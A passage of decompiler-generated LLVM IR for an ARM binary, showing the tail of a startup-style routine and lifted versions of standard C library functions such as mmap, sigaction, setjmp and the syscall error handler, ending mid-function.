  %v1_1515419 = load i32, i32* %r7.global-to-local, align 4
  %v3_1515421 = icmp uge i32 %v0_1515418, %v1_1515419
  store i1 %v3_1515421, i1* %cpsr_c.global-to-local, align 1
  %v9_1515427 = icmp eq i32 %v0_1515418, %v1_1515419
  store i1 %v9_1515427, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1515421, label %dec_label_pc_15188.lr.ph, label %dec_label_pc_15144

dec_label_pc_15144:                               ; preds = %bb84, %dec_label_pc_15144
  %v1_15144 = phi i32 [ %v1_15150, %dec_label_pc_15144 ], [ %v0_1515418, %bb84 ]
  %v0_15144 = load i32, i32* %r5.global-to-local, align 4
  %v2_15144 = and i32 %v1_15144, 1073741824
  %v3_15144 = icmp ne i32 %v2_15144, 0
  store i1 %v3_15144, i1* %cpsr_c.global-to-local, align 1
  %v4_15144 = mul i32 %v1_15144, 4
  %v5_15144 = add i32 %v4_15144, %v0_15144
  %v6_15144 = inttoptr i32 %v5_15144 to i32*
  %v7_15144 = load i32, i32* %v6_15144, align 4
  store i32 %v7_15144, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_15144)
  %v0_15150 = load i32, i32* %r4.global-to-local, align 4
  %v1_15150 = add i32 %v0_15150, 1
  store i32 %v1_15150, i32* %r4.global-to-local, align 4
  %v1_15154 = load i32, i32* %r7.global-to-local, align 4
  %v3_15154 = icmp uge i32 %v1_15150, %v1_15154
  store i1 %v3_15154, i1* %cpsr_c.global-to-local, align 1
  %v9_15154 = icmp eq i32 %v1_15150, %v1_15154
  store i1 %v9_15154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15154, label %dec_label_pc_15188.lr.ph, label %dec_label_pc_15144

dec_label_pc_15188.lr.ph:                         ; preds = %dec_label_pc_15144, %bb84
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1515c = icmp eq i32 %v0_14fa8, 0
  store i1 %v2_1515c, i1* %cpsr_z.global-to-local, align 1
  %v2_15164 = xor i1 %v2_1515c, true
  call void @__pseudo_cond_branch(i1 %v2_15164, i32 %v0_14fa8)
  store i32 -12, i32* %r2.global-to-local, align 4
  %v2_15170 = load i32, i32* %stack_var_-416, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v2_1517c = add i32 %v2_15170, -12
  store i32 %v2_1517c, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_15188

dec_label_pc_15188:                               ; preds = %dec_label_pc_15188.dec_label_pc_15188_crit_edge, %dec_label_pc_15188.lr.ph
  %v1_15188 = phi i32 [ %v1_15194, %dec_label_pc_15188.dec_label_pc_15188_crit_edge ], [ 0, %dec_label_pc_15188.lr.ph ]
  %v0_15188 = phi i32 [ %v0_15188.pre, %dec_label_pc_15188.dec_label_pc_15188_crit_edge ], [ %v2_1517c, %dec_label_pc_15188.lr.ph ]
  %v2_15188 = and i32 %v1_15188, 1073741824
  %v3_15188 = icmp ne i32 %v2_15188, 0
  store i1 %v3_15188, i1* %cpsr_c.global-to-local, align 1
  %v4_15188 = mul i32 %v1_15188, 4
  %v5_15188 = add i32 %v4_15188, %v0_15188
  %v6_15188 = inttoptr i32 %v5_15188 to i32*
  %v7_15188 = load i32, i32* %v6_15188, align 4
  store i32 %v7_15188, i32* %ip.global-to-local, align 4
  store i32 86420, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_15188)
  %v0_15194 = load i32, i32* @r4, align 4
  %v1_15194 = add i32 %v0_15194, 1
  store i32 %v1_15194, i32* @r4, align 4
  %v1_15198 = load i32, i32* @r7, align 4
  %v3_15198 = icmp uge i32 %v1_15194, %v1_15198
  store i1 %v3_15198, i1* %cpsr_c.global-to-local, align 1
  %v9_15198 = icmp eq i32 %v1_15194, %v1_15198
  store i1 %v9_15198, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15198, label %dec_label_pc_151a0, label %dec_label_pc_15188.dec_label_pc_15188_crit_edge

dec_label_pc_15188.dec_label_pc_15188_crit_edge:  ; preds = %dec_label_pc_15188
  %v0_15188.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15188

dec_label_pc_151a0:                               ; preds = %dec_label_pc_15188
  %v2_151a4.pre = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_151a4.pre, i32* %r0.global-to-local, align 4
  %v2_151a8 = add i32 %v2_151a4.pre, -67232
  store i32 %v2_151a8, i32* %r2.global-to-local, align 4
  store i32 %v2_151a8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_151b0 = icmp eq i32 %v2_151a8, 0
  store i1 %v2_151b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_151b0, label %dec_label_pc_151c8, label %dec_label_pc_151b8

dec_label_pc_151b8:                               ; preds = %dec_label_pc_151a0
  store i32 86464, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_151a8)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_151c4 = load i32, i32* %r0.global-to-local, align 4
  %v2_151c4 = inttoptr i32 %v1_151c4 to i32*
  store i32 0, i32* %v2_151c4, align 4
  %v2_151cc.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_151c8

dec_label_pc_151c8:                               ; preds = %dec_label_pc_151a0, %dec_label_pc_151b8
  %v2_151cc = phi i32 [ %v2_151a4.pre, %dec_label_pc_151a0 ], [ %v2_151cc.pre, %dec_label_pc_151b8 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_151cc, i32* %r1.global-to-local, align 4
  %v2_151d0 = add i32 %v2_151cc, 128
  %v3_151d0 = inttoptr i32 %v2_151d0 to i32*
  %v4_151d0 = load i32, i32* %v3_151d0, align 4
  store i32 %v4_151d0, i32* %r2.global-to-local, align 4
  store i32 %v4_151d0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_151d8 = icmp eq i32 %v4_151d0, 0
  store i1 %v2_151d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_151d8, label %dec_label_pc_151f0, label %dec_label_pc_151e0

dec_label_pc_151e0:                               ; preds = %dec_label_pc_151c8
  store i32 86504, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_151d0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_151ec = load i32, i32* %r0.global-to-local, align 4
  %v2_151ec = inttoptr i32 %v1_151ec to i32*
  store i32 0, i32* %v2_151ec, align 4
  br label %dec_label_pc_151f0

dec_label_pc_151f0:                               ; preds = %dec_label_pc_151c8, %dec_label_pc_151e0
  %v2_151f0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_151f0, i32* @r0, align 4
  %v1_151f4 = call i32 @_setjmp(i32 %v2_151f0)
  store i32 %v1_151f4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_151f8 = icmp eq i32 %v1_151f4, 0
  store i1 %v2_151f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_151f8, label %dec_label_pc_15200, label %dec_label_pc_1524c

dec_label_pc_15200:                               ; preds = %dec_label_pc_151f0
  %v0_15200 = call i32 @__aeabi_read_tp()
  store i32 %v0_15200, i32* %r0.global-to-local, align 4
  %v1_15204 = add i32 %v0_15200, -1168
  store i32 %v1_15204, i32* %r2.global-to-local, align 4
  %v2_1520c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1520c, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_15218 = add i32 %v2_1520c, 56
  %v3_15218 = inttoptr i32 %v2_15218 to i32*
  %v4_15218 = load i32, i32* %v3_15218, align 4
  store i32 %v4_15218, i32* %ip.global-to-local, align 4
  store i32 %v2_151f0, i32* %r3.global-to-local, align 4
  %v2_15228 = add i32 %v0_15200, -1040
  %v3_15228 = inttoptr i32 %v2_15228 to i32*
  store i32 %v2_151f0, i32* %v3_15228, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_15234 = load i32, i32* %ip.global-to-local, align 4
  %v1_15234 = inttoptr i32 %v0_15234 to i32*
  %v2_15234 = load i32, i32* %v1_15234, align 4
  store i32 %v2_15234, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_15244 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_152e8

dec_label_pc_1524c:                               ; preds = %dec_label_pc_151f0
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_15250 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_15250, i32* %ip.global-to-local, align 4
  %v2_15254 = add i32 %v2_15250, 40
  %v3_15254 = inttoptr i32 %v2_15254 to i32*
  %v4_15254 = load i32, i32* %v3_15254, align 4
  store i32 %v4_15254, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_15254)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_15264 = load i32, i32* %stack_var_-416, align 4
  %v2_15268 = add i32 %v2_15264, 120
  %v3_15268 = inttoptr i32 %v2_15268 to i32*
  %v4_15268 = load i32, i32* %v3_15268, align 4
  store i32 %v4_15268, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1526c

dec_label_pc_1526c:                               ; preds = %dec_label_pc_152a0.dec_label_pc_1526c_crit_edge, %dec_label_pc_1524c
  %v0_1526c = phi i32 [ %v0_1526c.pre, %dec_label_pc_152a0.dec_label_pc_1526c_crit_edge ], [ %v4_15268, %dec_label_pc_1524c ]
  %v1_1526c = inttoptr i32 %v0_1526c to i32*
  %v2_1526c = load i32, i32* %v1_1526c, align 4
  store i32 %v0_1526c, i32* %r2.global-to-local, align 4
  store i32 %v2_1526c, i32* %r4.global-to-local, align 4
  %v1_15278 = add i32 %v2_1526c, -1
  store i32 %v1_15278, i32* %r1.global-to-local, align 4
  %v2_1527c89 = load i32, i32* %v1_1526c, align 4
  store i32 %v2_1527c89, i32* %r3.global-to-local, align 4
  %v3_1528091 = icmp uge i32 %v2_1527c89, %v2_1526c
  store i1 %v3_1528091, i1* %cpsr_c.global-to-local, align 1
  %v9_1528097 = icmp eq i32 %v2_1527c89, %v2_1526c
  store i1 %v9_1528097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1528097, label %dec_label_pc_15288, label %dec_label_pc_152a0

dec_label_pc_15288:                               ; preds = %dec_label_pc_1526c, %dec_label_pc_15288.dec_label_pc_1527c_crit_edge
  %v0_1528898 = phi i32 [ %v1_15280.pre, %dec_label_pc_15288.dec_label_pc_1527c_crit_edge ], [ %v2_1526c, %dec_label_pc_1526c ]
  store i32 %v0_1528898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15298 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15298, label %dec_label_pc_1529c, label %dec_label_pc_15288.dec_label_pc_1527c_crit_edge

dec_label_pc_15288.dec_label_pc_1527c_crit_edge:  ; preds = %dec_label_pc_15288
  %v0_1527c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15280.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1527c = inttoptr i32 %v0_1527c.pre to i32*
  %v2_1527c = load i32, i32* %v1_1527c, align 4
  store i32 %v2_1527c, i32* %r3.global-to-local, align 4
  %v3_15280 = icmp uge i32 %v2_1527c, %v1_15280.pre
  store i1 %v3_15280, i1* %cpsr_c.global-to-local, align 1
  %v9_15280 = icmp eq i32 %v2_1527c, %v1_15280.pre
  store i1 %v9_15280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_15280, label %dec_label_pc_15288, label %dec_label_pc_152a0

dec_label_pc_1529c:                               ; preds = %dec_label_pc_15288
  %v0_1529c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1529c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_152a0

dec_label_pc_152a0:                               ; preds = %dec_label_pc_1526c, %dec_label_pc_15288.dec_label_pc_1527c_crit_edge, %dec_label_pc_1529c
  %v0_152a8 = phi i32 [ %v0_1529c, %dec_label_pc_1529c ], [ %v2_1527c89, %dec_label_pc_1526c ], [ %v2_1527c, %dec_label_pc_15288.dec_label_pc_1527c_crit_edge ]
  %v1_152a0 = phi i32 [ %v0_1529c, %dec_label_pc_1529c ], [ %v2_1526c, %dec_label_pc_1526c ], [ %v1_15280.pre, %dec_label_pc_15288.dec_label_pc_1527c_crit_edge ]
  %v3_152a0 = icmp uge i32 %v0_152a8, %v1_152a0
  store i1 %v3_152a0, i1* %cpsr_c.global-to-local, align 1
  %v9_152a0 = icmp eq i32 %v0_152a8, %v1_152a0
  store i1 %v9_152a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_152a0, label %dec_label_pc_152a8, label %dec_label_pc_152a0.dec_label_pc_1526c_crit_edge

dec_label_pc_152a0.dec_label_pc_1526c_crit_edge:  ; preds = %dec_label_pc_152a0
  %v0_1526c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1526c

dec_label_pc_152a8:                               ; preds = %dec_label_pc_152a0
  %v2_152a8 = icmp ne i32 %v1_152a0, 0
  store i1 %v2_152a8, i1* %cpsr_c.global-to-local, align 1
  %v7_152a8 = icmp eq i32 %v1_152a0, 1
  store i1 %v7_152a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_152a8, label %dec_label_pc_152e8, label %dec_label_pc_152b0

dec_label_pc_152b0:                               ; preds = %dec_label_pc_152a8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_152e8

dec_label_pc_152e8:                               ; preds = %dec_label_pc_152a8, %dec_label_pc_152b0, %dec_label_pc_15200
  %storemerge2 = phi i32 [ %v0_15244, %dec_label_pc_15200 ], [ 0, %dec_label_pc_152b0 ], [ 0, %dec_label_pc_152a8 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_152ec = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_152ec, i32* %r0.global-to-local, align 4
  %v0_152f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_152f0, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_152e8
  %v1_152f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_152f0 = load i32, i32* %r2.global-to-local, align 4
  %v3_152f0 = mul i32 %v2_152f0, %v1_152f0
  %v2_152f4 = load i32, i32* @r8, align 4
  %v8_152f4 = shl i32 %v2_152f4, %v3_152f0
  %v9_152f4 = and i32 %v8_152f4, %v3_152f0
  %v8_152f8 = lshr i32 %v2_152f4, %v9_152f4
  %v9_152f8 = and i32 %v8_152f8, %v9_152f4
  %v2_152fc = inttoptr i32 %v9_152f8 to i64*
  %v3_152fc = load i64, i64* %v2_152fc, align 4
  %v5_152fc = trunc i64 %v3_152fc to i32
  %v6_152fc = udiv i64 %v3_152fc, 4294967296
  %v7_152fc = trunc i64 %v6_152fc to i32
  store i32 %v5_152fc, i32* %r1.global-to-local, align 4
  %v9_152fc = sub i32 %v7_152fc, %v2_152f4
  %v3_15300 = mul i32 %v9_152fc, %v1_152f0
  %v5_15308 = mul i32 %v1_152f0, 4
  %v5_1530c = udiv i32 %v1_152f0, 2
  %v6_15308 = and i32 %v5_1530c, %v5_15308
  %v6_1530c = and i32 %v6_15308, %v3_15300
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_1530c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_152e8, %bb85
  %v5_15310 = phi i32 [ %v1_152ec, %dec_label_pc_152e8 ], [ %v6_1530c, %bb85 ]
  ret i32 %v5_15310

; uselistorder directives
  uselistorder i32 %v1_152f0, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_152a0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1529c, { 1, 0, 2 }
  uselistorder i32 %v1_15280.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1526c, { 1, 0 }
  uselistorder i32 %v2_151cc, { 1, 0 }
  uselistorder i32 %v2_151a4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_15198, { 1, 0 }
  uselistorder i32 %v1_15194, { 3, 2, 1, 0 }
  uselistorder i32 %v1_15188, { 1, 0 }
  uselistorder i32 %v1_15154, { 1, 0 }
  uselistorder i32 %v1_15150, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15144, { 1, 0 }
  uselistorder i32 %v2_15120, { 1, 0, 2 }
  uselistorder i32 %v4_15104, { 1, 0, 2 }
  uselistorder i32 %v4_150f4, { 1, 0, 2, 3 }
  uselistorder i1 %v8_1503c, { 1, 2, 0 }
  uselistorder i32 %v2_15008, { 1, 2, 0 }
  uselistorder i32 %v1_15004, { 1, 2, 0 }
  uselistorder i1 %v2_14ff0, { 1, 0, 2 }
  uselistorder i32 %v5_14ff4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_14fc0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14fa8, { 1, 0, 2 }
  uselistorder i32 %v2_14f9c, { 1, 0, 2 }
  uselistorder i32 %v3_14f6c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 3, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 4, 1, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 2, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 1, 3, 4, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 1, 13, 14, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 3, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 0, 15, 17, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 2, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 8, 7, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 5, 4, 3 }
  uselistorder i32 2008, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_152e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_152a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15288, { 1, 0 }
  uselistorder label %dec_label_pc_151f0, { 1, 0 }
  uselistorder label %dec_label_pc_151c8, { 1, 0 }
  uselistorder label %dec_label_pc_15144, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_150c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15098, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_15008, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_14ff0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1533c = load i32, i32* @r4, align 4
  store i32 %v3_1533c, i32* %stack_var_-16, align 4
  %v3_15348 = urem i32 %arg3, 4096
  %v2_1534c = icmp eq i32 %v3_15348, 0
  br i1 %v2_1534c, label %dec_label_pc_15370, label %dec_label_pc_15354

dec_label_pc_15354:                               ; preds = %entry
  %v0_15358 = call i32 @__aeabi_read_tp()
  store i32 %v0_15358, i32* %r0.global-to-local, align 4
  %v3_1535c = load i16, i16* @global_var_2225c.361, align 2
  %v4_1535c = sext i16 %v3_1535c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_15368 = add i32 %v4_1535c, %v0_15358
  %v4_15368 = inttoptr i32 %v3_15368 to i32*
  store i32 22, i32* %v4_15368, align 4
  %v0_153a4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_153a4

dec_label_pc_15370:                               ; preds = %entry
  %v0_15380 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_15380, -4095
  br i1 %tmp, label %dec_label_pc_153a0, label %dec_label_pc_15388

dec_label_pc_15388:                               ; preds = %dec_label_pc_15370
  %v1_1538c = sub i32 0, %v0_15380
  %v3_15390 = load i16, i16* @global_var_2225c.361, align 2
  %v4_15390 = sext i16 %v3_15390 to i32
  %v0_15394 = call i32 @__aeabi_read_tp()
  %v3_15398 = add i32 %v4_15390, %v0_15394
  %v4_15398 = inttoptr i32 %v3_15398 to i32*
  store i32 %v1_1538c, i32* %v4_15398, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_153a0

dec_label_pc_153a0:                               ; preds = %dec_label_pc_15370, %dec_label_pc_15388
  %v0_153a0 = phi i32 [ %v0_15380, %dec_label_pc_15370 ], [ -1, %dec_label_pc_15388 ]
  store i32 %v0_153a0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_153a4

dec_label_pc_153a4:                               ; preds = %dec_label_pc_15354, %dec_label_pc_153a0
  %v0_153a4 = phi i32 [ %v0_153a4.pre, %dec_label_pc_15354 ], [ %v0_153a0, %dec_label_pc_153a0 ]
  store i32 %v0_153a4, i32* %r0.global-to-local, align 4
  %v2_153a8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_153a8, i32* @r4, align 4
  ret i32 %v0_153a4

; uselistorder directives
  uselistorder i32 %v0_153a4, { 1, 0 }
  uselistorder i32 %v0_15380, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_153a4, { 1, 0 }
  uselistorder label %dec_label_pc_153a0, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_153b8 = load i32, i32* @lr, align 4
  store i32 %v0_153b8, i32* %stack_var_-4, align 4
  %v0_153c0 = load i32, i32* @r0, align 4
  %v3_153c4 = load i16, i16* @global_var_2225c.361, align 2
  %v4_153c4 = sext i16 %v3_153c4 to i32
  store i32 %v4_153c4, i32* @r2, align 4
  %v0_153c8 = call i32 @__aeabi_read_tp()
  %v1_153cc = sub i32 0, %v0_153c0
  store i32 %v1_153cc, i32* @r3, align 4
  %v2_153d0 = load i32, i32* @r2, align 4
  %v3_153d0 = add i32 %v2_153d0, %v0_153c8
  %v4_153d0 = inttoptr i32 %v3_153d0 to i32*
  store i32 %v1_153cc, i32* %v4_153d0, align 4
  %v2_153d8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_153d8, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_153e4 = load i32, i32* @r4, align 4
  %v6_153e4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_153ec = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_22204.365 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_153ec, label %dec_label_pc_15440, label %dec_label_pc_15404

dec_label_pc_15404:                               ; preds = %entry
  %v1_15404 = add i32 %arg2, 4
  %v2_15404 = inttoptr i32 %v1_15404 to i32*
  %v3_15404 = load i32, i32* %v2_15404, align 4
  store i32 %v3_15404, i32* @r3, align 4
  %v1_15408 = and i32 %v3_15404, 67108864
  %v2_15408 = icmp eq i32 %v1_15408, 0
  br i1 %v2_15408, label %dec_label_pc_15410, label %dec_label_pc_15440

dec_label_pc_15410:                               ; preds = %dec_label_pc_15404
  store i32 20, i32* @r2, align 4
  %v2_15414 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_15414, i32* @r0, align 4
  %v0_15418 = call i32 @memcpy()
  %v0_15440.pre = load i32, i32* @r5, align 4
  %v0_15448.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15440

dec_label_pc_15440:                               ; preds = %dec_label_pc_15404, %entry, %dec_label_pc_15410
  %v0_15448 = phi i32 [ %arg3, %dec_label_pc_15404 ], [ %arg3, %entry ], [ %v0_15448.pre, %dec_label_pc_15410 ]
  %v0_15444 = phi i32 [ %arg2, %dec_label_pc_15404 ], [ 0, %entry ], [ %v2_15414, %dec_label_pc_15410 ]
  %v0_15440 = phi i32 [ %arg1, %dec_label_pc_15404 ], [ %arg1, %entry ], [ %v0_15440.pre, %dec_label_pc_15410 ]
  %v4_15450 = call i32 @__syscall_rt_sigaction(i32 %v0_15440, i32 %v0_15444, i32 %v0_15448, i32 8)
  store i32 %v3_153e4, i32* @r4, align 4
  store i32 %v6_153e4, i32* @r5, align 4
  ret i32 %v4_15450

; uselistorder directives
  uselistorder i32 67108864, { 1, 0 }
  uselistorder label %dec_label_pc_15440, { 2, 0, 1 }
}

define i32 @function_15464(i32 %arg1) local_unnamed_addr {
dec_label_pc_15464:
  %v0_15464 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15464, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_15464
  %v2_15464 = load i32, i32* @r8, align 4
  %v4_15464 = mul i32 %v2_15464, 2
  %v5_15464 = and i32 %v4_15464, %arg1
  %v2_15468 = load i32, i32* @ip, align 4
  %v4_15468 = lshr i32 %v2_15468, %v5_15464
  %v5_15468 = sub i32 32, %v5_15464
  %v6_15468 = shl i32 %v2_15468, %v5_15468
  %v7_15468 = or i32 %v6_15468, %v4_15468
  %v9_15468 = and i32 %v7_15468, %v5_15464
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_15464, %bb
  %v10_15468 = phi i32 [ %arg1, %dec_label_pc_15464 ], [ %v9_15468, %bb ]
  ret i32 %v10_15468

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_15470 = call i32 @__sigsetjmp()
  ret i32 %v0_15470
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_154a0 = load i32, i32* @r7, align 4
  store i32 %v3_154a0, i32* %stack_var_-8, align 4
  %v0_154ac = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_154ac, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_154ac, -4095
  br i1 %tmp, label %dec_label_pc_154d4, label %dec_label_pc_154bc

dec_label_pc_154bc:                               ; preds = %entry
  %v0_154c0 = call i32 @__aeabi_read_tp()
  %v3_154c4 = load i16, i16* @global_var_2225c.361, align 2
  %v4_154c4 = sext i16 %v3_154c4 to i32
  %v0_154c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_154c8 = sub i32 0, %v0_154c8
